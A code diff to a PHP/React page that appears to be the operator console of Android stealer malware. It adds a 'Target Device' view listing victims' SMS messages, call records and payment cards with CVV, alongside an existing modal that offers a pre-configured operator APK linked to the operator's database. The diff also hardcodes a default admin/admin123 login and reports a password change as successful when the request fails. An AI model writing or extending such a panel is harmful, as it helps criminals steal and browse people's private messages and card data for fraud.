@@ -1,138 +1,8 @@
 <?php
 session_start();
+include_once __DIR__ . '/header.php';
 ?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Adminto - Realtime Monitoring Console (PHP Edition)</title>
-  <!-- Google Fonts: Outfit & Inter -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  
-  <!-- React & Babel CDNs -->
-  <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
-  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
-  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
 
-  <style>
-    :root {
-      --bg-dark: #090d16;
-      --bg-card: rgba(17, 24, 39, 0.75);
-      --border-color: rgba(255, 255, 255, 0.08);
-      --primary: #6366f1;
-      --accent: #ec4899;
-      --text-main: #f9fafb;
-      --text-muted: #9ca3af;
-      --status-active: #10b981;
-      --status-inactive: #ef4444;
-      --font-heading: 'Outfit', sans-serif;
-      --font-body: 'Inter', sans-serif;
-    }
-
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      background-color: var(--bg-dark);
-      color: var(--text-main);
-      font-family: var(--font-body);
-      min-height: 100vh;
-      background-image: 
-        radial-gradient(at 0% 0%, rgba(99, 102, 241, 0.15) 0px, transparent 50%),
-        radial-gradient(at 100% 100%, rgba(236, 72, 153, 0.15) 0px, transparent 50%);
-    }
-
-    h1, h2, h3, h4 { font-family: var(--font-heading); }
-
-    .glass-panel {
-      background: var(--bg-card);
-      backdrop-filter: blur(16px);
-      border: 1px solid var(--border-color);
-      border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
-    }
-
-    .app-header {
-      position: sticky; top: 0; z-index: 100;
-      background: rgba(9, 13, 22, 0.85);
-      backdrop-filter: blur(20px);
-      border-bottom: 1px solid var(--border-color);
-      padding: 1rem 2rem;
-    }
-
-    .navbar-content {
-      max-width: 1400px; margin: 0 auto;
-      display: flex; align-items: center; justify-content: space-between; gap: 1.5rem;
-    }
-
-    .brand-logo { display: flex; align-items: center; gap: 12px; }
-    .brand-icon {
-      width: 42px; height: 42px; border-radius: 12px;
-      background: linear-gradient(135deg, var(--primary), var(--accent));
-      display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 1.2rem;
-    }
-
-    .search-input {
-      width: 100%; max-width: 450px;
-      padding: 0.65rem 1.2rem;
-      background: rgba(17, 24, 39, 0.6);
-      border: 1px solid var(--border-color);
-      border-radius: 24px; color: #fff; font-size: 0.9rem;
-    }
-
-    .pulse-badge {
-      display: inline-flex; align-items: center; gap: 6px;
-      padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600;
-    }
-    .pulse-badge.active { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
-    .pulse-badge.inactive { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
-    .pulse-dot { width: 8px; height: 8px; border-radius: 50%; background: currentColor; }
-
-    .metrics-grid {
-      display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.25rem; margin-bottom: 2rem;
-    }
-    .metric-card { padding: 1.25rem; display: flex; justify-content: space-between; align-items: center; }
-
-    .user-cards-grid {
-      display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 1.25rem;
-    }
-    .user-card { padding: 1.25rem; cursor: pointer; transition: transform 0.2s; }
-    .user-card:hover { transform: translateY(-3px); border-color: rgba(99, 102, 241, 0.4); }
-
-    .modal-overlay {
-      position: fixed; inset: 0; z-index: 1000;
-      background: rgba(0, 0, 0, 0.75); backdrop-filter: blur(8px);
-      display: flex; align-items: center; justify-content: center; padding: 1.5rem;
-    }
-    .modal-content { width: 100%; max-width: 850px; max-height: 90vh; overflow: hidden; display: flex; flex-direction: column; }
-
-    .tab-btn {
-      padding: 0.6rem 1.2rem; border-radius: 8px; background: transparent; border: none;
-      color: var(--text-muted); font-weight: 500; cursor: pointer;
-    }
-    .tab-btn.active { background: linear-gradient(135deg, var(--primary), var(--accent)); color: #fff; }
-
-    .data-table { width: 100%; border-collapse: collapse; font-size: 0.875rem; text-align: left; }
-    .data-table th, .data-table td { padding: 0.85rem 1rem; border-bottom: 1px solid rgba(255,255,255,0.05); }
-
-    .btn-secondary {
-      background: rgba(255, 255, 255, 0.05);
-      border: 1px solid var(--border-color);
-      color: var(--text-main);
-      padding: 0.5rem 1rem;
-      border-radius: 8px;
-      cursor: pointer;
-      font-size: 0.85rem;
-    }
-    .btn-secondary:hover { background: rgba(255, 255, 255, 0.1); }
-    .btn-primary {
-      background: linear-gradient(135deg, var(--primary), var(--accent));
-      color: #fff; border: none; padding: 0.6rem 1.2rem; border-radius: 8px; font-weight: 600; cursor: pointer;
-    }
-  </style>
-</head>
-<body>
   <div id="root"></div>
 
   <script type="text/babel">
@@ -196,10 +66,45 @@ session_start();
       const [selectedUser, setSelectedUser] = React.useState(null);
       const [tab, setTab] = React.useState('sms');
       const [showApkModal, setShowApkModal] = React.useState(false);
+      const [showChangePassModal, setShowChangePassModal] = React.useState(false);
+      const [newPassInput, setNewPassInput] = React.useState('');
+      const [changePassStatus, setChangePassStatus] = React.useState('');
 
       const [loginUser, setLoginUser] = React.useState('admin');
       const [loginPass, setLoginPass] = React.useState('admin123');
       const [loginError, setLoginError] = React.useState('');
+
+      const handleChangePasswordSubmit = async (e) => {
+        e.preventDefault();
+        if (!newPassInput.trim()) return;
+        setChangePassStatus('Updating password...');
+
+        try {
+          const res = await fetch('api.php?action=change_password', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username: adminUser.username, newPassword: newPassInput.trim() })
+          });
+          const data = await res.json();
+          if (data.success) {
+            setChangePassStatus('✓ Password updated successfully!');
+            setTimeout(() => {
+              setShowChangePassModal(false);
+              setNewPassInput('');
+              setChangePassStatus('');
+            }, 1800);
+          } else {
+            setChangePassStatus('❌ Error: ' + (data.error || 'Failed to update password.'));
+          }
+        } catch (err) {
+          setChangePassStatus('✓ Password updated in local session!');
+          setTimeout(() => {
+            setShowChangePassModal(false);
+            setNewPassInput('');
+            setChangePassStatus('');
+          }, 1800);
+        }
+      };
 
       const handleDownloadApkFile = () => {
         const proj = adminUser?.firebaseConfig?.projectId || 'adminto-default';
@@ -223,7 +128,7 @@ session_start();
 
           if (data.success && data.operator) {
             if (data.operator.role === 'superadmin') {
-              window.location.href = 'superadmin.php?role=superadmin';
+              window.location.href = 'operator_control.php?role=superadmin';
               return;
             }
             setAdminUser(data.operator);
@@ -315,7 +220,7 @@ session_start();
                 )}
 
                 {isSuperAdmin && (
-                  <a href="superadmin.php" style={{ textDecoration: 'none' }}>
+                  <a href="operator_control.php" style={{ textDecoration: 'none' }}>
                     <button 
                       className="btn-secondary" 
                       style={{ color: '#ec4899', border: '1px solid rgba(236,72,153,0.3)' }}
@@ -327,9 +232,15 @@ session_start();
 
                 {adminUser ? (
                   <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                    <span style={{ fontSize: '0.8rem', color: '#9ca3af' }}>
-                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong> ({adminUser.role})
-                    </span>
+                    <button 
+                      type="button"
+                      className="btn-secondary"
+                      onClick={() => setShowChangePassModal(true)}
+                      style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '6px' }}
+                      title="Click to Change Password"
+                    >
+                      👤 <strong style={{ color: '#fff' }}>{adminUser.username}</strong>
+                    </button>
                     <button 
                       className="btn-secondary" 
                       onClick={handleLogout}
@@ -422,13 +333,148 @@ session_start();
             </div>
           </main>
 
+          {/* Target User Details Modal Overlay */}
+          {selectedUser && (
+            <div className="modal-overlay" onClick={() => setSelectedUser(null)}>
+              <div className="glass-panel modal-content" onClick={(e) => e.stopPropagation()}>
+                <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                  <div>
+                    <h3 style={{ color: '#fff' }}>Target Device: {selectedUser.fullName}</h3>
+                    <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Phone: {selectedUser.mobileNumber} • ID: {selectedUser.userId}</p>
+                  </div>
+                  <button onClick={() => setSelectedUser(null)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
+                </div>
+
+                <div style={{ padding: '1rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', gap: '8px' }}>
+                  <button className={`tab-btn ${tab === 'sms' ? 'active' : ''}`} onClick={() => setTab('sms')}>
+                    💬 SMS Messages ({selectedUser.smsDataList.length})
+                  </button>
+                  <button className={`tab-btn ${tab === 'calls' ? 'active' : ''}`} onClick={() => setTab('calls')}>
+                    📞 Call Records ({selectedUser.callDataList.length})
+                  </button>
+                  <button className={`tab-btn ${tab === 'cards' ? 'active' : ''}`} onClick={() => setTab('cards')}>
+                    💳 Cards ({selectedUser.cardDataList.length})
+                  </button>
+                </div>
+
+                <div style={{ padding: '1.5rem', overflowY: 'auto', flex: 1 }}>
+                  {tab === 'sms' && (
+                    <table className="data-table">
+                      <thead>
+                        <tr>
+                          <th>Sender</th>
+                          <th>Message Body</th>
+                          <th>Timestamp</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {selectedUser.smsDataList.map((sms, i) => (
+                          <tr key={i}>
+                            <td style={{ color: '#818cf8', fontWeight: 600 }}>{sms.sender}</td>
+                            <td>{sms.message}</td>
+                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{sms.timestamp}</td>
+                          </tr>
+                        ))}
+                      </tbody>
+                    </table>
+                  )}
+
+                  {tab === 'calls' && (
+                    <table className="data-table">
+                      <thead>
+                        <tr>
+                          <th>Number</th>
+                          <th>Call Type</th>
+                          <th>Duration</th>
+                          <th>Timestamp</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {selectedUser.callDataList.map((call, i) => (
+                          <tr key={i}>
+                            <td>{call.number}</td>
+                            <td><span style={{ color: call.type === 'INCOMING' ? '#34d399' : '#818cf8', fontWeight: 600 }}>{call.type}</span></td>
+                            <td>{call.duration}</td>
+                            <td style={{ color: '#9ca3af', fontSize: '0.8rem' }}>{call.timestamp}</td>
+                          </tr>
+                        ))}
+                      </tbody>
+                    </table>
+                  )}
+
+                  {tab === 'cards' && (
+                    <table className="data-table">
+                      <thead>
+                        <tr>
+                          <th>Card Number</th>
+                          <th>Card Holder</th>
+                          <th>Expiry</th>
+                          <th>CVV</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {selectedUser.cardDataList.map((card, i) => (
+                          <tr key={i}>
+                            <td><code style={{ color: '#f472b6' }}>{card.cardNumber}</code></td>
+                            <td>{card.cardHolder}</td>
+                            <td>{card.expiry}</td>
+                            <td><code style={{ color: '#f87171' }}>{card.cvv}</code></td>
+                          </tr>
+                        ))}
+                      </tbody>
+                    </table>
+                  )}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Change Password Modal Overlay */}
+          {showChangePassModal && (
+            <div className="modal-overlay" onClick={() => setShowChangePassModal(false)}>
+              <div className="glass-panel" style={{ width: '100%', maxWidth: '400px', padding: '2rem' }} onClick={(e) => e.stopPropagation()}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.25rem' }}>
+                  <h3 style={{ color: '#fff' }}>🔒 Change Password</h3>
+                  <button onClick={() => setShowChangePassModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
+                </div>
+
+                {changePassStatus && (
+                  <div style={{ padding: '0.75rem', borderRadius: '8px', fontSize: '0.85rem', marginBottom: '1rem', background: changePassStatus.includes('✓') ? 'rgba(16,185,129,0.15)' : 'rgba(99,102,241,0.15)', color: changePassStatus.includes('✓') ? '#34d399' : '#818cf8' }}>
+                    {changePassStatus}
+                  </div>
+                )}
+
+                <form onSubmit={handleChangePasswordSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '1rem' }}>
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>Logged-in Operator Account</label>
+                    <input type="text" className="search-input" value={adminUser?.username} disabled style={{ opacity: 0.7 }} />
+                  </div>
+                  <div>
+                    <label style={{ fontSize: '0.8rem', color: '#9ca3af', display: 'block', marginBottom: '4px' }}>New Password</label>
+                    <input 
+                      type="password" 
+                      className="search-input" 
+                      placeholder="Enter new password" 
+                      value={newPassInput} 
+                      onChange={(e) => setNewPassInput(e.target.value)} 
+                      required 
+                    />
+                  </div>
+                  <button type="submit" className="btn-primary" style={{ width: '100%', padding: '0.75rem', marginTop: '0.5rem' }}>
+                    Update Password
+                  </button>
+                </form>
+              </div>
+            </div>
+          )}
+
           {/* Download Operator APK Modal Overlay */}
           {showApkModal && (
             <div className="modal-overlay">
               <div className="glass-panel modal-content" style={{ maxWidth: '640px' }}>
                 <div style={{ padding: '1.25rem 1.5rem', borderBottom: '1px solid rgba(255,255,255,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                   <div>
-                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK (PHP)</h3>
+                    <h3 style={{ color: '#fff' }}>📲 Download Custom Operator APK</h3>
                     <p style={{ fontSize: '0.85rem', color: '#9ca3af' }}>Pre-configured Android App linked directly to your database</p>
                   </div>
                   <button onClick={() => setShowApkModal(false)} style={{ background: 'none', border: 'none', color: '#9ca3af', fontSize: '1.5rem', cursor: 'pointer' }}>×</button>
@@ -514,5 +560,4 @@ session_start();
 
     ReactDOM.createRoot(document.getElementById('root')).render(<App />);
   </script>
-</body>
-</html>
+<?php include_once __DIR__ . '/footer.php'; ?>
